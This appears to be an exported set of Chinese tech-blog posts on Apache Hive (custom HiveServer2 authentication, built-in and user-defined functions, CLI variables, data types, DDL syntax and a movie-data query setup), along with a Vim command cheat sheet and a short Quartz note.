文件内容为K,V信息,对应用户的用户名和密码. 1234567891011121314151617&lt;!--认证类型默认NONE.有如下选项: NONE (uses plain SASL), NOSASL, KERBEROS, LDAP, PAM , CUSTOM.--&gt;&lt;property&gt;&lt;name&gt;hive.server2.authentication&lt;/name&gt;&lt;value&gt;CUSTOM&lt;/value&gt;&lt;/property&gt;&lt;!--自定义认证类--&gt;&lt;property&gt;&lt;name&gt;hive.server2.custom.authentication.class&lt;/name&gt;&lt;value&gt;com.xwolf.big.hive.HiveServerCustomeAuth&lt;/value&gt;&lt;/property&gt;&lt;!--配置文件位置,新增此属性--&gt;&lt;property&gt;&lt;name&gt;hive.server2.custom.authentication.file&lt;/name&gt;&lt;value&gt;/opt/hadoop/hive-2.3.0/conf/users.conf&lt;/value&gt;&lt;/property&gt; 测试同样是打包上传到Hive lib目录下,重启Hive.只有输入正确的用户名和密码才能链接进入beeline. 123456789101112## 认证失败会抛出异常信息javax.security.sasl.AuthenticationException at com.xwolf.big.hive.HiveServerCustomeAuth.Authenticate(HiveServerCustomeAuth.java:50) at org.apache.hive.service.auth.CustomAuthenticationProviderImpl.Authenticate(CustomAuthenticationProviderImpl.java:54) at org.apache.hive.service.auth.PlainSaslHelper$PlainServerCallbackHandler.handle(PlainSaslHelper.java:107) at org.apache.hive.service.auth.PlainSaslServer.evaluateResponse(PlainSaslServer.java:103)## 认证成功,打印出对应的用户信息[user]=root,[password]=root1234,authenticate success 参考资料 Hive官网Hive server认证","updated":"2020-07-19T00:23:27.960Z","tags":[{"name":"hive","slug":"hive","permalink":"http://xwolf191.github.io/tags/hive/"}]},{"title":"Hive函数","date":"2018-01-30T09:20:00.000Z","path":"2018/01/30/大数据/Hive函数/","text":"本篇主要介绍Hive的内置函数和自定义函数,以2.3.0版本为例. 内置函数Hive内部提供了很多函数给开发者使用，包括数学函数，类型转换函数，条件函数，字符函数，聚合函数，表生成函数等等，这些函数都统称为内置函数。 数学函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455-- 自然常数select e();-- 2.718281828459045-- 圆周率select pi();-- 3.141592653589793-- 正弦、余弦、正切、反正弦、反余弦、反正切select sin(0) ,cos(0),tan(pi()/4),asin(1),acos(1),atan(1);-- 弧度角度转换函数select degrees(pi()/2),radians(90);-- 90.0 | 1.5707963267948966-- positive直接返回原数,negative 返回相反数,abs 绝对值select positive(-32.4343) , negative(-32),abs(-32);-- -32.4343 | 32 |32-- 四舍五入函数 注意和bround的区别select round(12.62),round(12.55,1),round(13.556,2),bround(12.65,1),bround(12.66,1);-- 13 | 12.6 | 13.56 | 12.6 | 12.7-- 小于指定数字的最大数和大于指定数字的最小数select floor(12.98),ceil(12.32);-- 12 13-- 随机数,如果指定参数生成的随机数是固定的select rand(),rand(23);+-- -- -- -- -- -- -- -- -- -- +-- -- -- -- -- -- -- -- -- -- -+| _c0 | _c1 |+-- -- -- -- -- -- -- -- -- -- +-- -- -- -- -- -- -- -- -- -- -+| 0.447675386320312 | 0.7321323355141605 |+-- -- -- -- -- -- -- -- -- -- +-- -- -- -- -- -- -- -- -- -- -+select rand(),rand(23);+-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+| _c0 | _c1 |+-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+| 0.6958761143570242 | 0.7321323355141605 |+-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+select rand(),rand(23);+-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+| _c0 | _c1 |+-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+| 0.7471695196174757 | 0.7321323355141605 |+-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+-- a的b次幂,阶乘,平方根,立方根,自然常数e的n次方select pow(2,3),factorial(4),sqrt(81),cbrt(27),exp(2);-- 8.0 | 24 | 9.0 | 3.0|7.3890560989306495-- 对数select ln(e()),log2(8), log10(100),log(4,64);-- 1.0 | 3.0 | 2.0 | 3.0-- 最大值/最小值select greatest(12,43,54.32,22.54,34.22),least(12,43,54.32,22.54,34.22);-- 54.32 | 12.00-- 左移、右移、无符号右移 select shiftleft(2,3),shiftright(-12,2),shiftrightunsigned(12,2),shiftrightunsigned(-12,2);-- 16 | -3 | 3 | 1073741821 日期函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677-- 获取当前时间戳,返回Bigintselect unix_timestamp();-- 1517314216-- 获取当前日期select current_date();-- 2018-01-30-- 获取当前时间字符串 select current_timestamp;-- 2018-01-30 20:08:45.598-- 时间戳转化为指定格式的字符串select from_unixtime(1517314216,'YYYY-MM-DD HH:mm:ss.SSS');-- 2018-01-30 20:10:16.000-- 获取时间戳的日期部分,返回日期对象select to_date('2016-10-21 20:20:21');-- 2016-10-21-- 取日期的年份select year('2014-10-21');-- 2014-- 取日期的月份select month('2014-10-21');-- 10-- 取日期的日期select day('2014-10-21 21:30:21');-- 21select dayofmonth('2014-10-21 21:30:21');-- 21-- 取日期的小时数select hour('2014-10-21 21:30:21');-- 21-- 取日期的分钟数select minute('2014-10-21 21:30:21');-- 30-- 取日期的秒数select second('2014-10-21 21:30:21');-- 21-- 日期加上指定天数后的日期select date_add('2014-10-21 21:30:21',2);-- 2014-10-23select date_add('2014-10-21 21:30:21',-2);-- 2014-10-19-- 日期减去指定天数后的日期select date_sub('2014-10-21 21:30:21',2);-- 2014-10-19select date_sub('2014-10-21 21:30:21',-2);-- 2014-10-23-- 将日期转化为指定时区的时间select from_utc_timestamp('2018-09-21 12:11:21.231','PST');-- 2018-09-21 05:11:21.231select from_utc_timestamp('2018-09-21 12:11:21.231','UTC');-- 2018-09-21 12:11:21.231select from_utc_timestamp('2018-09-21 12:11:21.231','GMT+8');-- 2018-09-21 20:11:21.231select from_utc_timestamp('2018-09-21 12:11:21.231','UTC+8');-- 2018-09-21 12:11:21.231-- datediff(end,start) end-start的日期差select datediff('2012-12-08','2012-12-20');-- -12-- 获取日期月份差值(end,start)select months_between('2012-12-08','2013-12-20');-- -12.38709677-- 指定日期添加指定月份的日期select add_months('2012-12-08',2);-- 2013-02-08-- 获取日期最后一天的日期select last_day('2012-12-08');-- 2012-12-31-- 获取当前时间开始的下一个 周一select next_day('2017-12-08','MONDAY');-- 2017-12-11-- 按照指定格式格式化截取日期 MONTH/MON/MM, YEAR/YYYY/YY.select trunc('2015-03-17', 'YEAR');-- 2015-01-01select trunc('2015-03-17', 'YYYY');-- 2015-01-01select trunc('2015-03-17', 'MONTH');-- 2015-03-01-- 指定格式格式化日期select date_format(\"2018-07-12\",\"MM-dd\");-- 07-12 条件函数123456789101112131415161718192021222324252627282930-- 是否为空判断函数select isnull(\"\"),isnull(null),isnotnull(null),isnotnull(\"\");-- false | true | false | true-- if(a,b,c) ,a为true返回b,a为false返回aselect if(1&gt;2,1,3),if(1&lt;2,1,3); -- 3 | 1-- 如果为null,返回一个默认值select nvl(null,1),nvl(2,0); -- 1| 2-- 返回第一个不为null的值select coalesce(null,null,null,2,34);-- 2-- 断言,true返回null,否则抛出异常select assert_true(1&gt;2);Error: java.io.IOException: org.apache.hadoop.hive.ql.metadata.HiveException: ASSERT_TRUE(): assertion failed. (state=,code=0)select assert_true(1==1);+-- -- -- -+| _c0 |+-- -- -- -+| NULL |+-- -- -- -+-- CASE a WHEN b THEN c [WHEN d THEN e] ELSE f, a==b返回c,a==d 返回e,否则返回f. select CASE '3' WHEN '2' THEN 'is true' WHEN '3' THEN 'equals 3' ELSE 'No Result' END;-- CASE WHEN a THEN b [WHEN c THEN d]* [ELSE e] END; a为true 返回b,c为true返回d,否则返回e.select CASE WHEN 1==2 THEN 'is true' WHEN 2==3 THEN 'is false' ELSE 'No result' END; 字符串函数123456789101112131415161718192021222324252627282930313233343536373839-- 返回字符串的第一个字符的ascii值select ascii('0ABCD');-- 48-- 返回ascii值对应的字符select chr(65);-- A-- 返回字符长度select character_length('哎呀A23456');-- 8-- 字符串拼接select concat('234','Abc哎呀');-- 234Abc哎呀-- 用指定的分隔符拼接字符串select concat_ws('$','2',\"哎呀\",\"Python\",\"R\",\"Scala\");-- 2$哎呀$Python$R$Scala-- set中元素的位置,找不到返回0select find_in_set('1','2,3,4,5,1,3,1');-- 5-- 分割 select split('a,b,c,d',',');-- [\"a\",\"b\",\"c\",\"d\"]-- 字符串截取、翻转、去空格,重复字符串N次select length(\"ABC\"),substr(\"ABC123\",3),substring(\"ABC123\",3),trim(\" A B CDF \"),reverse(\"ABCDE123\"),repeat('ABC',3);-- 3 | C123 | C123 | A B CDF | 321EDCBA |ABCABCABCselect substring_index(, string delim, int count);-- -- 字符串替换,仔细看看translate的用法select translate('ABCDE123ABC','A','##');-- #BCDE123#BCselect replace ('ABCDE123ABC','A','##');-- ##BCDE123##BCselect translate('ABCDE123ABC',\"AB\",\"#$#@\");-- #$CDE123#$Cselect translate('ABCDE123ABCD',\"ABCD\",\"#$#@\");-- #$#@E123#$#@-- soundex code,更多信息参考wikiselect soundex('Hello');-- H400 二进制操作函数base64,unbase64暂时不举例了. 聚合函数 返回值 函数名称 描述 BIGINT count(*), count(expr), count(DISTINCT expr[, expr…]) 总数 DOUBLE sum(col), sum(DISTINCT col) 求和 DOUBLE avg(col), avg(DISTINCT col) 求平均值 DOUBLE variance(col), var_pop(col) 返回组中数字列的方差 DOUBLE var_samp(col) 返回组中一个数值列的无偏样本方差 DOUBLE stddev_pop(col) 返回组中数字列的标准差 DOUBLE stddev_samp(col) 返回组中数字列的无偏抽样标准偏差 DOUBLE covar_pop(col1, col2) 返回组中一对数字列的总体协方差 DOUBLE covar_samp(col1, col2) 返回组中一对数字列的协方差 DOUBLE corr(col1, col2) 返回该组中一对数字列的相关性的皮尔森系数 DOUBLE percentile(BIGINT col, p) 返回该组中一对数字列的相关性的皮尔森系数 DOUBLE regr_count(independent, dependent) 返回用于适应线性回归直线的非空对的数量 array collect_set(col) 返回一组具有重复元素的对象。 array collect_list(col) 返回一个具有重复的对象列表 INTEGER ntile(INTEGER x) 将一个有序分区划分为一个名为bucket的x组，并将一个bucket编号分配给分区中的每一行。 遮盖(加密)函数1234567891011121314151617181920212223242526272829-- 遮盖前几个select mask_first_n('1234_4332_32',4);-- nnnn_4332_32-- 遮盖后几个select mask_last_n('1234_4332_32',4);-- 1234_433n_nn-- 前几个显示select mask_show_first_n('1234_4332_32',2);-- 12nn_nnnn_nn-- 后几个显示select mask_show_last_n('1234_4332_32',2);-- nnnn_nnnn_32-- hash函数select mask_hash('123456');-- e10adc3949ba59abbe56e057f20f883e-- 获取当前用户select current_user();-- 当前数据库select current_database();-- 登录用户select logged_in_user();-- 获取md5select md5('123456');-- crc32select crc32('1234');-- sha,sha加密select sha('123456'),sha1('123456'),sha2('123456',224);-- 7c4a8d09ca3762af61e59520943dc26494f8941b | 7c4a8d09ca3762af61e59520943dc26494f8941b | f8cdb04495ded47615258f9dc6a3f4707fd2405434fefc3cbf4ef4e6 aes加解密,反射不做演示. 自定义函数编写Hive函数,实体类需要继承UDF,需要有自定义方法evaluate。 123456789101112131415161718192021package com.xwolf.big.hive;import org.apache.hadoop.hive.ql.exec.UDF;import org.apache.hadoop.io.Text;/** * 转化为大写字母 * @author xwolf * @since 1.8 **/public class UpperCase extends UDF &#123; public Text evaluate(final Text s) &#123; if (s == null) &#123; return null; &#125; return new Text(s.toString().toUpperCase()); &#125;&#125; 将文件打包为jar,上传到hive lib目录下,重启hive。 12345678910111213141516171819##创建自定义函数create function to_upper_case as 'com.xwolf.big.hive.UpperCase';##使用函数select to_upper_case('afdsf343');+-- -- -- -- -- -+| _c0 |+-- -- -- -- -- -+| AFDSF343 |+-- -- -- -- -- -+1 row selected (1.429 seconds)##查看函数描述describe function to_upper_case;+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +| tab_name |+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +| There is no documentation for function 'to_upper_case' |+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + 参考资料 Hive 官方文档 自定义函数官方文档 Soundex","updated":"2020-07-19T00:23:27.961Z","tags":[{"name":"hive","slug":"hive","permalink":"http://xwolf191.github.io/tags/hive/"}]},{"title":"vim命令","date":"2018-01-22T07:30:00.000Z","path":"2018/01/22/linux/vim命令/","text":"Vi和Vim的使用基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是：命令模式： 用户刚刚启动 vi/vim，便进入了命令模式。 此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。 以下是常用的几个命令： i 切换到输入模式，以输入字符。 x 删除当前光标所在处的字符。 : 切换到底线命令模式，以在最底一行输入命令。 若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。 命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。 Vim 基本命令 分类 命令 一、文件打开、保存、另存为、新建关闭 vim filepath //编辑filepath文件,不存在也可以 :e filepath //打开filepath文件 :w //保存文件 :sav filepath //另存为指定文件 :wq //保存并退出 :q //退出编辑器 :q! //强制退出编辑器 二、插入 i //在光标之前插入 a //在光标之后插入 A //在一行的结尾处追加 I //在一行的开头处插入 o // 在光标所在位置的下一行打开新行插入 O // 在光标所在位置的上一行打开新行插入 J //合并光标所在行及下一行为一行 R //替换(覆盖)当前光标位置及后面的内容 cw // 替换从光标所在位置后到一个单词结尾的字符 三、光标移动 上下左右方向键 空格键 向右、Backspace 向左、Enter 移动到下一行首、- 移动到上一行首。 命令模式下：h 向左、j 向下 、k 向上、l 向右。 :$ //到末尾 :n // n为数字,跳转到指定行的行首,:0跳转到第一行的行首 四、删除、恢复字符或行 x //删除当前光标下的字符 nx //删除从光标开始的n个字符 dw //删除光标之后的单词剩余部分 d$ //删除光标之后的该行剩余部分 dd //删除当前行 ndd //向下删除当前行在内的n行 :m,nd //删除m到n行的内容 u //撤销上一步操作 U //撤销对当前行的所有操作 五、搜索和替换 /word //向光标下搜索word字符串 ?word //向光标上搜索word字符串 n //向下搜索前一个搜素动作 N //向上搜索前一个搜索动作 :s/old/new //用new替换行中首次出现的old :s/old/new/g //用new替换行中所有的old :n1,n2s/word1/word2/g //n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 :1,$s/word1/word2/g //从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 :1,$s/word1/word2/gc //从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！ 六、复制、粘贴 yy //复制游标所在的那一行 nyy //n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行 y1G //复制游标所在行到第一行的所有数据 yG //复制游标所在行到最后一行的所有数据 y0 //复制光标所在的那个字符到该行行首的所有数据 y^ //复制从光标到行首的内容。 y$ //复制光标所在的那个字符到该行行尾的所有数据 yw //复制从光标开始到词尾的字符。 nyw //复制从光标开始的n个单词。 p,P //p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 七、环境设置 :set nu //设置行号 :set nonu //取消行号 参考 Linux vi/vim","updated":"2020-07-19T00:23:27.895Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"Hive查询","date":"2018-01-17T09:20:00.000Z","path":"2018/01/17/大数据/Hive查询/","text":"这一节主要介绍Hive的查询。 构造数据准备电影数据300M. 123456789101112131415161718192021222324252627282930313233343536373839404142434445--切换默认存储位置的数据库use test;--创建标签表create table tags (tagId bigint,tag string comment 'tag name') comment 'tags of movie'ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.OpenCSVSerde' WITH SERDEPROPERTIES (\"separatorChar\" = \",\") STORED AS TEXTFILE;--导入标签信息load data local inpath '/opt/open/ml-latest/genome-tags.csv' into table tags;--创建电影表create table movies (movieId bigint,title string comment 'movie name',genres Array&lt;string&gt; COMMENT 'The kinds of Movie') COMMENT 'movies'ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.OpenCSVSerde'WITH SERDEPROPERTIES (\"separatorChar\" = \",\",\"colelction.delim\"=\"|\") STORED AS TEXTFILE;--导入数据load data local inpath '/opt/open/ml-latest/movies.csv' into table movies;--用户评价create table user_rating (userId bigint,movieId bigint,rating decimal(1,1) comment 'movie rate',rate_time TIMESTAMP ) COMMENT 'user rate'ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.OpenCSVSerde'WITH SERDEPROPERTIES (\"separatorChar\" = \",\") STORED AS TEXTFILE;--导入数据load data local inpath '/opt/open/ml-latest/ratings.csv' into table user_rating;--用户电影标签信息create table user_movie_tag (userId bigint,movieId bigint,tag string comment 'movie rate',user_movie_time TIMESTAMP ) COMMENT 'user movie tag 'ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.OpenCSVSerde'WITH SERDEPROPERTIES (\"separatorChar\" = \",\") STORED AS TEXTFILE;--导入数据load data local inpath '/opt/open/ml-latest/tags.csv' into table user_movie_tag; 开搞 123456---查看电影总数、唯一的电影数量select count(1) from movies;--join select count(*) from movies m join user_rating u on (m.movieid=u.movieid); 未完,待续… 参考资料 LanguageManual Select","updated":"2020-07-19T00:23:27.962Z","tags":[{"name":"hive","slug":"hive","permalink":"http://xwolf191.github.io/tags/hive/"}]},{"title":"Quartz 并发问题","date":"2018-01-16T07:40:00.000Z","path":"2018/01/16/distributed/Quartz并发问题/","text":"假设一个job设置为每1分钟执行一次,但是业务执行完成需要5分钟。为避免此问题,设置并发属性为false即可.","updated":"2020-07-19T00:23:27.812Z","tags":[{"name":"quartz","slug":"quartz","permalink":"http://xwolf191.github.io/tags/quartz/"}]},{"title":"Hive基础学习","date":"2018-01-15T07:45:00.000Z","path":"2018/01/15/大数据/Hive基础学习/","text":"hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用,十分适合数据仓库的统计分析。 安装安装不做介绍,主要依赖Hadoop环境。参考官网配置安装即可。此处以Hive-2.3.0来展开。主要是格式化元数据,执行 schematool -dbType mysql -initSchema 即可。 命令行界面hive命令行界面选项 123456789101112131415# ./hive --help --service cliusage: hive -d,--define &lt;key=value&gt; Variable substitution to apply to Hive commands. e.g. -d A=B or --define A=B --database &lt;databasename&gt; Specify the database to use -e &lt;quoted-query-string&gt; SQL from command line -f &lt;filename&gt; SQL from files -H,--help Print help information --hiveconf &lt;property=value&gt; Use value for given property --hivevar &lt;key=value&gt; Variable substitution to apply to Hive commands. e.g. --hivevar A=B -i &lt;filename&gt; Initialization SQL file -S,--silent Silent mode in interactive shell -v,--verbose Verbose mode (echo executed SQL to the console) 进入命令行界面,从Hive0.14开始beetline作为新的命令行界面(稍后介绍)。 1# ./hive --service cli 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# &gt;hive set;hive.optimize.skewjoin=falsehive.optimize.skewjoin.compiletime=falsehive.optimize.sort.dynamic.partition=falsehive.optimize.union.remove=falsehive.orc.cache.stripe.details.mem.size=256Mbhive.orc.cache.use.soft.references=falsehive.orc.compute.splits.num.threads=10hive.orc.splits.allow.synthetic.fileid=truehive.orc.splits.directory.batch.ms=0hive.orc.splits.include.file.footer=falsehive.orc.splits.include.fileid=truehive.orc.splits.ms.footer.cache.enabled=falsehive.orc.splits.ms.footer.cache.ppd.enabled=truehive.order.columnalignment=truehive.orderby.position.alias=truehive.parquet.timestamp.skip.conversion=truehive.ppd.recognizetransivity=truehive.ppd.remove.duplicatefilters=true# &gt;hive set -v;env:HADOOP_PID_DIR=env:HADOOP_PORTMAP_OPTS=-Xmx512m env:HADOOP_PREFIX=/opt/hadoop/hadoop-2.7.4env:HADOOP_SECONDARYNAMENODE_OPTS=-Dhadoop.security.logger=INFO,RFAS -Dhdfs.audit.logger=INFO,NullAppender env:HADOOP_SECURE_DN_LOG_DIR=/env:HADOOP_SECURE_DN_PID_DIR=env:HADOOP_SECURE_DN_USER=env:HADOOP_USER_CLASSPATH_FIRST=trueenv:HADOOP_YARN_HOME=/opt/hadoop/hadoop-2.7.4env:HBASE_HOME=/opt/hadoop/hbase-1.3.1env:HISTCONTROL=ignoredupsenv:HISTSIZE=1000env:HIVE_AUX_JARS_PATH=/opt/hadoop/hive-2.3.0/libenv:HIVE_CONF_DIR=/opt/hadoop/hive-2.3.0/confenv:HIVE_HOME=/opt/hadoop/hive-2.3.0env:HOME=/rootenv:HOSTNAME=hadoop01env:JAVA_HOME=/usr/java/jdk1.8.0_144env:KAFKA_HOME=/opt/hadoop/kafka_2.12-0.11.0.1env:KYLIN_HOME=/opt/hadoop/kylin-2.2.0env:LANG=en_US.UTF-8env:LD_LIBRARY_PATH=:/opt/hadoop/hadoop-2.7.4/lib/nativeenv:LESSOPEN=||/usr/bin/lesspipe.sh %senv:LOGNAME=rootsystem:java.class.version=52.0system:java.endorsed.dirs=/usr/java/jdk1.8.0_144/jre/lib/endorsedsystem:java.ext.dirs=/usr/java/jdk1.8.0_144/jre/lib/ext:/usr/java/packages/lib/extsystem:java.home=/usr/java/jdk1.8.0_144/jresystem:java.io.tmpdir=/tmpsystem:java.library.path=/opt/hadoop/hadoop-2.7.4/lib/nativesystem:java.net.preferIPv4Stack=truesystem:java.runtime.name=Java(TM) SE Runtime Environmentsystem:java.runtime.version=1.8.0_144-b01system:java.specification.name=Java Platform API Specificationsystem:java.specification.vendor=Oracle Corporationsystem:java.specification.version=1.8system:java.util.logging.config.file=/opt/hadoop/hive-2.3.0/conf/parquet-logging.propertiessystem:java.vendor=Oracle Corporationsystem:java.vendor.url=http://java.oracle.com/system:java.vendor.url.bug=http://bugreport.sun.com/bugreport/system:java.version=1.8.0_144system:java.vm.info=mixed modesystem:java.vm.name=Java HotSpot(TM) 64-Bit Server VMsystem:java.vm.specification.name=Java Virtual Machine Specificationsystem:java.vm.specification.vendor=Oracle Corporationsystem:java.vm.specification.version=1.8system:java.vm.vendor=Oracle Corporationsystem:java.vm.version=25.144-b01system:line.separator=system:log4j.configurationFile=hive-log4j2.propertiessystem:os.arch=amd64system:os.name=Linuxsystem:os.version=2.6.32-696.el6.x86_64system:path.separator=:system:proc_hivecli= set 命令会打印命名空间hivevar,hivecong,sytem和env中的所有变量。加上-v,会打印Hadoop中定义的所有属性,例如控制HDFS和MapReduce。 还可以查看指定变量的值. 1234# &gt;hive set env:HOME;env:HOME=/root# &gt;hive set system:os.version;system:os.version=2.6.32-696.el6.x86_64 自定义变量—define key=value。 1234# ./hive -define username=LAOWANG;# hive&gt; set username;username=LAOWANG 数据类型 基本数据类型 数据类型 长度 说明 TINYINT 1Byte -128 到 127 SMALLINT 2Byte -32,768 到 32,767 INT/INTEGER 4Byte -2,147,483,648 到 2,147,483,647 BIGINT 8Byte -9,223,372,036,854,775,808 到 9,223,372,036,854,775,807 FLOAT 4Byte 单精度浮点数 DOUBLE 8Byte 双精度浮点数 DOUBLE PRECISION (v2.2.0+) 8Byte DOUBLE的别名 DECIMAL (v0.11.0) 0.11.0有38个精度的数字,0.13.0开始用户可自定义精度 NUMERIC(v3.0.0+) 和DECIMAL一样 BOOLEAN BINARY(v0.8.0+) 日期类型 数据类型 长度 说明 TIMESTAMP (v0.8.0+) DATE (v0.12.0+) INTERVAL (v1.2.0+) 字符串 数据类型 长度 说明 STRING (v0.12.0+) CHAR (v0.13.0+) VARCHAR (v0.12.0+) 复合类型 数据类型 长度 说明 arrays (v0.14+) maps (v0.14+) MAP structs (v0.12.0+) STRUCT union (v0.7.0+) UNIONTYPE Hive DDL数据库操作 查看数据库 123456789101112131415##查看所有的数据库# hive&gt; show databases;##查看模糊匹配的数据库# hive&gt; show databases like 't.*';##打印当前的数据库#hive&gt; set hive.cli.print.current.db=true;#切换数据库#hive (default)&gt; use test1;OKTime taken: 0.097 seconds##显示当前的数据库#hive (test1)&gt; 创建数据库 语法: CREATE (DATABASE|SCHEMA) [IF NOT EXISTS] database_name [COMMENT database_comment] [LOCATION hdfs_path] [WITH DBPROPERTIES (property_name=property_value, …)]; 12345##创建数据库#&gt;hive create database IF NOT EXISTS test comment 'test database' ;##location指定db文件的位置,默认hive.metastore.warehouse.dir配置的路径.#hive&gt; create database IF NOT EXISTS test2 comment 'test database' location '/hive/tests/test.db' ; 修改数据库 语法: ALTER (DATABASE|SCHEMA) database_name SET DBPROPERTIES (property_name=property_value, …); — ( 0.14.0以后可用) ALTER (DATABASE|SCHEMA) database_name SET OWNER [USER|ROLE] user_or_role; — (0.13.0 以后可用; SCHEMA added in Hive 0.14.0) ALTER (DATABASE|SCHEMA) database_name SET LOCATION hdfs_path; — (2.2.1, 2.4.0 以后可用) 123456789101112#查看建库语句#hive&gt; describe schema test1;OKtest1 test database hdfs://hn1/hive/tests root USER Time taken: 0.043 seconds, Fetched: 1 row(s)#hive&gt; describe database test1;OKtest1 test database hdfs://hn1/hive/tests root USER Time taken: 0.044 seconds, Fetched: 1 row(s)#修改数据库#&gt;hive alter schema test1 set dbproperties ('create_by'='xwolf','create_time'='2018-01-15 20:35'); 修改完成后,查看mysql中元数据信息: 1234567891011121314151617mysql&gt; select * from DATABASE_PARAMS;+-------+-------------+------------------+| DB_ID | PARAM_KEY | PARAM_VALUE |+-------+-------------+------------------+| 7 | create_by | xwolf || 7 | create_time | 2018-01-15 20:35 |+-------+-------------+------------------+2 rows in set (0.00 sec)mysql&gt; select * from DBS where DB_ID = 7;+-------+---------------+-----------------------+-------+------------+------------+| DB_ID | DESC | DB_LOCATION_URI | NAME | OWNER_NAME | OWNER_TYPE |+-------+---------------+-----------------------+-------+------------+------------+| 7 | test database | hdfs://hn1/hive/tests | test1 | root | USER |+-------+---------------+-----------------------+-------+------------+------------+1 row in set (0.00 sec) 删除数据库 语法:DROP (DATABASE|SCHEMA) [IF EXISTS] database_name [RESTRICT|CASCADE]; 1234567891011121314#数据库中有表时无法删除#hive (test1)&gt; drop schema if exists test1;FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. InvalidOperationException(message:Database test1 is not empty. One or more tables exist.)#hive (test1)&gt; drop schema if exists test1 restrict;FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. InvalidOperationException(message:Database test1 is not empty. One or more tables exist.)#级联删除可删除所有关联的表和数据.#hive (test1)&gt; drop database if exists test1 cascade;OKTime taken: 2.623 seconds 表操作 创建表 语法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576CREATE [TEMPORARY] [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name -- ( TEMPORARY 在0.14.0版本后可用) [(col_name data_type [COMMENT col_comment], ... [constraint_specification])] [COMMENT table_comment] [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)] [CLUSTERED BY (col_name, col_name, ...) [SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS] [SKEWED BY (col_name, col_name, ...) -- ( 0.10.0版本后可用)] ON ((col_value, col_value, ...), (col_value, col_value, ...), ...) [STORED AS DIRECTORIES] [ [ROW FORMAT row_format] [STORED AS file_format] | STORED BY &apos;storage.handler.class.name&apos; [WITH SERDEPROPERTIES (...)] -- (0.6.0后可用) ] [LOCATION hdfs_path] [TBLPROPERTIES (property_name=property_value, ...)] -- (0.6.0后可用) [AS select_statement]; -- (0.5.0后可用; 不支持外部表)CREATE [TEMPORARY] [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name LIKE existing_table_or_view_name [LOCATION hdfs_path];data_typ : primitive_type | array_type | map_type | struct_type | union_type -- (0.7.0后可用)primitive_type : TINYINT | SMALLINT | INT | BIGINT | BOOLEAN | FLOAT | DOUBLE | DOUBLE PRECISION -- (2.2.0后可用) | STRING | BINARY -- (0.8.0后可用) | TIMESTAMP -- (0.8.0后可用) | DECIMAL -- (0.11.0后可用) | DECIMAL(precision, scale) -- (0.13.0后可用) | DATE -- (0.12.0后可用) | VARCHAR -- (0.12.0后可用) | CHAR -- (0.13.0后可用)array_type : ARRAY &lt; data_type &gt;map_type : MAP &lt; primitive_type, data_type &gt;struct_type : STRUCT &lt; col_name : data_type [COMMENT col_comment], ...&gt;union_type : UNIONTYPE &lt; data_type, data_type, ... &gt; -- (0.7.0后可用)row_format : DELIMITED [FIELDS TERMINATED BY char [ESCAPED BY char]] [COLLECTION ITEMS TERMINATED BY char] [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char] [NULL DEFINED AS char] -- (0.13.0后可用) | SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, ...)]file_format: : SEQUENCEFILE | TEXTFILE -- (Default, depending on hive.default.fileformat configuration) | RCFILE -- (0.6.0后可用) | ORC -- (0.11.0后可用) | PARQUET -- (0.13.0后可用) | AVRO -- (0.14.0后可用) | INPUTFORMAT input_format_classname OUTPUTFORMAT output_format_classnameconstraint_specification: : [, PRIMARY KEY (col_name, ...) DISABLE NOVALIDATE ] [, CONSTRAINT constraint_name FOREIGN KEY (col_name, ...) REFERENCES table_name(col_name, ...) 